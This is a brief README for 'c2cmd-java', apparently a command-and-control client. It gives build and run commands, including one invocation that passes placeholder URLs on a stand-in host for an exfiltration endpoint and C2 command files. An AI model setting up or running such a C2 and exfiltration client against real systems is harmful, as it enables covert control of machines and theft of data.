# c2cmd-java

```Your Urls have to be added to the Java source code.```

To create the jar and run within its own directory:

```
javac c2cmd.java
jar -cvmf c2cmd.mf c2cmd.jar *
```
To run it (with your url changes compiled above) 
```
java -jar c2cmd.jar
```
or run it like
```
java -jar c2cmd.jar https://SOMEHOST/exfil https://SOMEHOST/exploit/c2/2c.php?get=1 https://SOMEHOST/exploit/c2/c2.txt 2
```
